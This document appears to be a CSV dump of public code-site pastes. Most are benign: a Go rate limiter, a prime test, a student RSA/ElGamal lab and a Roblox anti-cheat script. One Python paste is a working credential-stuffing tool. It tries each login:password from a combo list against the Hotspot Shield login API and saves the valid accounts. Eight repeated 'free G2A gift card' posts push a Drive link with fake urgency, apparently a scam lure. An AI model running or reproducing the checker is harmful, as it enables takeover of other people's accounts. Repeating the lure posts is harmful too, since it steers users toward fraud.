id,title,username,language,date,content
Vs1dBxrb,Ratelimit,sava-cska,Go,Wednesday 5th of June 2024 10:24:03 AM CDT,"//go:build !solution

package ratelimit

import (
	""context""
	""errors""
	""sync""
	""time""
)

// Limiter is precise rate limiter with context support.
type Limiter struct {
	maxCount int
	interval time.Duration
	launched []time.Time
	locked   sync.Mutex
	stopped  bool
}

var ErrStopped = errors.New(""limiter stopped"")

// NewLimiter returns limiter that throttles rate of successful Acquire() calls
// to maxSize events at any given interval.
func NewLimiter(maxCount int, interval time.Duration) *Limiter {
	return &Limiter{maxCount: maxCount, interval: interval, launched: []time.Time{},
		locked: sync.Mutex{}, stopped: false}
}

func (l *Limiter) processAcquire(ctx context.Context) (bool, error) {
	if l.stopped {
		return true, ErrStopped
	}
	if ctx.Err() != nil {
		return true, ctx.Err()
	}

	for len(l.launched) > 0 && time.Since(l.launched[0]) > l.interval {
		l.launched = l.launched[1:]
	}

	if len(l.launched) < l.maxCount {
		l.launched = append(l.launched, time.Now())
		return true, nil
	} else {
		return false, nil
	}
}

func (l *Limiter) Acquire(ctx context.Context) error {
	for {
		l.locked.Lock()
		finish, err := l.processAcquire(ctx)
		l.locked.Unlock()
		if finish {
			return err
		} else {
			var sleepTime time.Duration = 0
			var interval time.Duration
			if l.interval < time.Second {
				interval = l.interval
			} else {
				interval = time.Second
			}
			for sleepTime < l.interval {
				time.Sleep(interval)
				sleepTime += interval
				if ctx.Err() != nil {
					return ctx.Err()
				}
			}
		}
	}
}

func (l *Limiter) Stop() {
	l.locked.Lock()
	l.stopped = true
	l.locked.Unlock()
}
"
S2iu4vAk,Untitled,MeehoweCK,C++,Wednesday 5th of June 2024 10:22:34 AM CDT,"bool primal(int liczba) {
	if (liczba < 2) {
		return false;
	}
	for (auto i{ 2 }; i * i <= liczba; ++i) {
		if (liczba % i == 0) {
			return false;
		}
	}
	return true;
}"
YMwnDgn8,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,atakan1983,JavaScript,Wednesday 5th of June 2024 10:22:15 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
4nd of June 2024"
mMe4aQwv,Untitled,Maloy_2969,Python,Wednesday 5th of June 2024 10:20:48 AM CDT,"import requests
import json
base=str(input(""Введите путь к базе:\n""))
file=open(base)
for x in file:
    log=x.split(':')[0]
    pas=x.split(':')[1]
    sess = requests.Session()
    #ss=sess.get('https://www.hotspotshield.com/')
    ss=sess.post('https://app.hotspotshield.com/api/user/login',headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded xcd ',
        'Accept':'application/json, text/plain, */*'
    },data={
        'login':log,
        'password':pas
    })
   
    if ss.status_code==200:
        ss=sess.get('https://app.hotspotshield.com/api/user/info',headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded xcd ',
        'Accept':'application/json, text/plain, */*'
    })
        data_acc=json.loads(ss.text)
        plan=data_acc['data']['membership']['plan']
        print(x + "" - ""+ plan)
        if plan=='Basic':
            basic_acs=open('basic.txt','a')
            basic_acs.write(log+"":""+pas)
        else:
            other_acs=open('other.txt','a')
            other_acs.write(log+"":""+pas)
    else:
        print(log+"":""+pas + "" - невалид"")"
gujCj3cN,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,ColtM4A2,JavaScript,Wednesday 5th of June 2024 10:16:06 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
June 4nd 2024"
tcewh4fQ,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Skarface-MKL,JavaScript,Wednesday 5th of June 2024 10:10:02 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
4nd of June 2024"
T6KGfHtk,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,thepplayz,JavaScript,Wednesday 5th of June 2024 10:03:59 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
June 4nd 2024"
1uTCS5Hc,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sirmikey,JavaScript,Wednesday 5th of June 2024 09:57:57 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
4nd of June 2024"
pdsVsUsW,james royal snowybot v3.14,coinwalk,JavaScript,Wednesday 5th of June 2024 09:53:40 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var belance = elderly;
var greatie = elderly;
var prefit = 0.0001; //10000 divide balance;
var beast = prefit;
var winnerdinner = elderly;
var snow = elderly;
var stroke = 0;
var broke = 0;
var freak = false;
var dork = Number(document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText);
var elven = 0;
 
function go(){
chunk = Number(document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText);
elven = Number(document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText);
if ((elven>dork)&&(chunk<49.5000)){
    stroke = stroke+1;
    broke = 0;
    freak = true;
    belance = belance+beast;
    dork = parseFloat(elven);
}
if ((elven>dork)&&(chunk>=49.5000)){
    broke = broke+1;
    freak = false;
    belance = belance-beast;
    dork = parseFloat(elven);
}
var cat = ((belance-elderly).toFixed(8));
console.log(""profit"");
console.log(cat);
var dog = (belance-snow);
if (dog<0){
saved = ((dog-dog)-dog);
}
if (dog>=0){
saved = prefit;
snow = parseFloat(belance);
}
if (saved<prefit){
saved = prefit;
}
if ((stroke==1)&&(freak)) {
    beast = saved;
}
if (stroke==2) {
    beast = 0;
    stroke = 0;
} 
if ((broke>=1)&&(!freak)) {
    beast = 0;
    stroke = 0;
} 
if (belance>=240)  {
    console.log(""winner winner chicken dinner"");
    return;
} 
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
 
go();"
P2mtRiKh,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,sayid83,JavaScript,Wednesday 5th of June 2024 09:51:51 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
4nd of June 2024"
8chqXnmg,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,PetrikDev,JavaScript,Wednesday 5th of June 2024 09:45:50 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
4nd of June 2024"
K5Db1tEC,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,x3kiN,JavaScript,Wednesday 5th of June 2024 09:39:31 AM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?654

Working as of:
June 4 2024"
vX8Ac595,Untitled,johnnypb,C#,Wednesday 5th of June 2024 09:39:04 AM CDT,"        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState,
            out char[] chars)
        {
            var dwhkl = GetActiveKeyboard(); //get the active keyboard layout
            TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
        }

        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl,
            out char[] chars)
        {
            var pwszBuff = new StringBuilder(64);
            var keyboardState = KeyboardState.GetCurrent();
            var currentKeyboardState = keyboardState.GetNativeState();
            var isDead = false;

            if (keyboardState.IsDown(Keys.ShiftKey))
                currentKeyboardState[(byte) Keys.ShiftKey] = 0x80;

            if (keyboardState.IsToggled(Keys.CapsLock))
                currentKeyboardState[(byte) Keys.CapsLock] = 0x01;

            var relevantChars = ToUnicodeEx(virtualKeyCode, scanCode, currentKeyboardState, pwszBuff, pwszBuff.Capacity,
                fuState, dwhkl);

            switch (relevantChars)
            {
                case -1:
                    isDead = true;
                    ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
                    chars = null;
                    break;

                case 0:
                    chars = null;
                    break;

                case 1:
                    if (pwszBuff.Length > 0) chars = new[] {pwszBuff[0]};
                    else chars = null;
                    break;

                // Two or more (only two of them is relevant)
                default:
                    if (pwszBuff.Length > 1) chars = new[] {pwszBuff[0], pwszBuff[1]};
                    else chars = new[] {pwszBuff[0]};
                    break;
            }

            if (lastVirtualKeyCode != 0 && lastIsDead)
            {
                if (chars != null)
                {
                    var sbTemp = new StringBuilder(5);
                    ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, 0, dwhkl);
                    lastIsDead = false;
                    lastVirtualKeyCode = 0;
                }

                return;
            }

            lastScanCode = scanCode;
            lastVirtualKeyCode = virtualKeyCode;
            lastIsDead = isDead;
            lastKeyState = (byte[]) currentKeyboardState.Clone();
        }


        private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
        {
            var sb = new StringBuilder(10);

            int rc;
            do
            {
                var lpKeyStateNull = new byte[255];
                rc = ToUnicodeEx(vk, sc, lpKeyStateNull, sb, sb.Capacity, 0, hkl);
            } while (rc < 0);
        }
"
Pe0xh3Rg,lr5_krypta,Teammasik,Python,Wednesday 5th of June 2024 09:37:37 AM CDT,"# эль гамай
import tkinter as tk
from tkinter import messagebox
import random

abc = {chr(i): (ord(chr(i)) - ord('а') + 1) for i in range(ord('а'), ord('я') + 1)}


def hash_func(message):
    return sum(ord(c) for c in message)


def generate_numbers():
    p = int(entry_p.get(""1.0"", tk.END))
    g = random.randint(2, p)
    x = random.randint(2, p)

    y = (g ** x) % p

    global open_keys, closed_keys
    open_keys = [x]
    closed_keys = [y, g, p]


def calculate_k(p):
    g = 0
    k = 3
    while g != 1:
        k = random.randrange(1, p-2)
        if is_prime(k):
            g = gcd(k, p)
    return k


def create_signature():
    generate_numbers()
    message = entry_plaintext.get(""1.0"", tk.END)[0:-1]
    p = closed_keys[2]
    g = closed_keys[1]
    x = open_keys[0]

    message = hash_func(message)
    while True:
        k = random.randint(2, p - 2)
        if gcd(k, p - 1) == 1:
            break

    a = (g ** k) % p
    b = ((message - x * a) * k) % (p - 1)
    a = int(a)
    b = int(b)

    text_area.delete('1.0', tk.END)
    text_area.insert('1.0', ','.join(map(str, [a, b])))


def check_signature():
    a, b = [float(char) for char in text_area.get('1.0', tk.END).split(',')]
    a, b = int(a), int(b)

    message = entry_plaintext.get('1.0', tk.END)[0:-1]
    y = closed_keys[0]
    p = closed_keys[2]
    g = closed_keys[1]

    m = hash_func(message)

    print(y, a, b, g, m)
    left = ((y ** a) * (a ** b)) % p
    right = (g ** m) % p
    print(left, right)
    if left == right:
        messagebox.showinfo(""Результат"", ""текст: Signature is correct!"")
    else:
        messagebox.showinfo(""Результат"", ""текст: Signature is incorrect"")


def is_prime(n):
    d = 2
    while n % d != 0:
        d += 1
    return d == n


def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a


root = tk.Tk()
root.title(""Алгоритм Эль-Гамая"")

closed_keys = []
open_keys = []

frame_keys = tk.Frame(root)
frame_keys.pack(pady=10)


frame_encrypted_text = tk.Frame(root)
frame_encrypted_text.pack(pady=10)

label_encrypted_text = tk.Label(frame_encrypted_text, text=""зашифрованное сообщение:"")
label_encrypted_text.pack(side=tk.LEFT)

text_area = tk.Text(frame_encrypted_text, height=2, width=15)
text_area.pack(side=tk.LEFT)

button_decrypt = tk.Button(frame_encrypted_text, text=""Проверить"", command=check_signature)
button_decrypt.pack(side=tk.RIGHT)

frame_encrypt = tk.Frame(root)
frame_encrypt.pack(pady=10)

label_p = tk.Label(frame_encrypt, text=""p:"")
label_p.pack(side=tk.LEFT)

entry_p = tk.Text(frame_encrypt, height=1, width=15)
entry_p.pack(side=tk.LEFT)

label_plaintext = tk.Label(frame_encrypt, text=""Текст:"")
label_plaintext.pack(side=tk.LEFT)

entry_plaintext = tk.Text(frame_encrypt, height=1, width=15)
entry_plaintext.pack(side=tk.LEFT)

button_encrypt = tk.Button(frame_encrypt, text=""Зашифровать"", command=create_signature)
button_encrypt.pack(side=tk.LEFT)

root.mainloop()




#rsa--------------------------------------------------------------------------------------------
import tkinter as tk
from tkinter import messagebox
import random

abc = {chr(i): (ord(chr(i)) - ord('а') + 1) for i in range(ord('а'), ord('я') + 1)}


def calculate_n(p, q):
    return p * q


def calculate_phi(p, q):
    return (p - 1) * (q - 1)


def calculate_e(phi):
    g = 0
    e = 3
    while g != 1:
        e = random.randrange(1, phi)
        if is_prime(e):
            g = gcd(e, phi)
    return e


def calculate_d(e, phi):
    d = 0
    while (e * d) % phi != 1:
        d += 1
    return d


def is_prime(n):
    d = 2
    while n % d != 0:
        d += 1
    return d == n


def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a


def get_key(d, value):
    for k, v in d.items():
        if v == value:
            return k


def encrypt(e, n, plaintext):
    ciphertext = [(abc[char] ** e) % n for char in plaintext]
    text = [abc[char] for char in plaintext]
    print(text)
    return ciphertext


def decrypt(private_key, ciphertext, open_keys, defText):
    p, q, phi, d = private_key
    n, e = open_keys
    plaintext = []

    for num in ciphertext:
        plaintext.append(get_key(abc, ((num ** e) % n)))
    if len(plaintext) != len(defText):
        return ""signature is incorrect!""
    for i in range(len(plaintext)):
        if defText[i] != plaintext[i]:
            return ""signature is incorrect!""
    return ""signature is correct!""


def calculate_closed_key_c(text, d, n):
    ciphertext = [(abc[char] ** d) % n for char in text]
    return ciphertext


def create_keys():
    p = int(entry_p.get(""1.0"", tk.END))
    q = int(entry_q.get(""1.0"", tk.END))

    n = calculate_n(p, q)
    phi = calculate_phi(p, q)
    e = calculate_e(phi)
    d = calculate_d(e, phi)

    global open_keys, closed_keys
    open_keys = [n, e]
    closed_keys = [p, q, phi, d]
    messagebox.showinfo(""Результат дешифрования"", f""Созданные ключи: {open_keys, closed_keys}"")


def encrypt_message():
    plaintext = entry_plaintext.get(""1.0"", tk.END)[0:-1]
    #entry_plaintext.delete('1.0', tk.END)
    e = open_keys[1]
    n = open_keys[0]
    d = closed_keys[3]
    c = calculate_closed_key_c(plaintext, d, n)

    text_area.delete('1.0', tk.END)
    text_area.insert('1.0', ','.join(map(str, c)))
    messagebox.showinfo(""Результат шифрования"", f""Зашифрованный текст: {c}"")


def check_signature():
    defText = entry_plaintext.get(""1.0"", tk.END)[0:-1]
    ciphertext = [int(char) for char in text_area.get('1.0', tk.END).split(',')]
    signature = decrypt(closed_keys, ciphertext, open_keys, defText)

    messagebox.showinfo(""Результат проверки"", f""Результат проверки: {signature}"")


def check_signature2():
    defText = entry_plaintext.get(""1.0"", tk.END)[0:-1]
    ciphertext = [int(char) for char in text_area2.get('1.0', tk.END).split(',')]
    signature = decrypt(closed_keys, ciphertext, open_keys, defText)

    messagebox.showinfo(""Результат проверки"", f""Результат проверки: {signature}"")


root = tk.Tk()
root.title(""Алгоритм RSA"")

closed_keys = []  # p, q, phi, d
open_keys = []  # e,n


frame_keys = tk.Frame(root)
frame_keys.pack(pady=10)

button_create_keys = tk.Button(frame_keys, text=""Создать ключи"", command=create_keys)
button_create_keys.pack()

frame_encrypted_text = tk.Frame(root)
frame_encrypted_text.pack(pady=10)

label_encrypted_text = tk.Label(frame_encrypted_text, text=""зашифрованное сообщение:"")
label_encrypted_text.pack(side=tk.LEFT)

text_area = tk.Text(frame_encrypted_text, height=2, width=15)
text_area.pack(side=tk.LEFT)

button_decrypt = tk.Button(frame_encrypted_text, text=""Проверить"", command=check_signature)
button_decrypt.pack(side=tk.RIGHT)

frame_input_text = tk.Frame(root)
frame_input_text.pack(pady=10)

label_input_text = tk.Label(frame_input_text, text=""Введите ключ:"") #
label_input_text.pack(side=tk.LEFT)

button_decrypt2 = tk.Button(frame_input_text, text=""Проверить"", command=check_signature2)
button_decrypt2.pack(side=tk.RIGHT)

text_area2 = tk.Text(frame_input_text, height=2, width=15)
text_area2.pack(side=tk.LEFT)

frame_encrypt = tk.Frame(root)
frame_encrypt.pack(pady=10)

label_p = tk.Label(frame_encrypt, text=""p:"")
label_p.pack(side=tk.LEFT)

entry_p = tk.Text(frame_encrypt, height=1, width=15)
entry_p.pack(side=tk.LEFT)

label_q = tk.Label(frame_encrypt, text=""q:"")
label_q.pack(side=tk.LEFT)

entry_q = tk.Text(frame_encrypt, height=1, width=15)
entry_q.pack(side=tk.LEFT)

label_plaintext = tk.Label(frame_encrypt, text=""Текст:"")
label_plaintext.pack(side=tk.LEFT)

entry_plaintext = tk.Text(frame_encrypt, height=1, width=15)
entry_plaintext.pack(side=tk.LEFT)

button_encrypt = tk.Button(frame_encrypt, text=""Зашифровать"", command=encrypt_message)
button_encrypt.pack(side=tk.LEFT)

root.mainloop()
"
htFDeLzi,detekted,rrixh,Lua,Wednesday 5th of June 2024 09:36:23 AM CDT,"local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")

local MaxWalkSpeed = 16
local CheckInterval = 1

local function onPlayerAdded(player)
    local character = player.Character or player.CharacterAdded:Wait()
    
    --[[ monitor ws]]
    local humanoid = character:WaitForChild(""Humanoid"")
    humanoid:GetPropertyChangedSignal(""WalkSpeed""):Connect(function()
        if humanoid.WalkSpeed > MaxWalkSpeed then
            player:Kick(""what the hell is u doing"")
        end
    end);

local lastpos = character.PrimaryPart.Position;
    RunService.Heartbeat:Connect(function()
local kurrentPos=character.PrimaryPart.Position
   local distanxe = (kurrentPos - lastpos).magnitude
        if distanxe > (MaxWalkSpeed * CheckInterval * 1.5) then
            player:Kick(""flying detekted"")
        end
        lastpos = kurrentPos
    end)
end;

Players.PlayerAdded:Connect(onPlayerAdded)

for _, player in pairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end;"
